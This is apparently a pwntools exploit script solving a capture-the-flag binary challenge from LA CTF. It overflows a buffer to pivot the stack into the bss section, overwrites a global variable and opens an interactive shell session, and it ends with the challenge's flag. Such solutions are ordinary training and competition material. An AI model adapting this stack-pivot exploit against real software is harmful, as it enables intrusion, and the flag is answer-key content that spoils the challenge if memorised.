from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall', '''
    b *(vuln+52)
    continue
''')

# p = remote('chall.lac.tf', 31593)

# stack pivot to bss section to overwrite a global variable (pay attention to fgets)
p.sendafter(b"Hey there, I'm deaddead. Who are you?\n", b'A'*0x20+p64(0x404540+0x20)+p64(0x4012c1)[:7])
p.sendafter(b"Hey there, I'm deaddead. Who are you?\n", p64(0xf1eeee2d)+b'A'*0x20+p64(0x4011d6)[:7])

p.interactive()

# lactf{1s_tHi5_y0Ur_1St_3vER_p1VooT}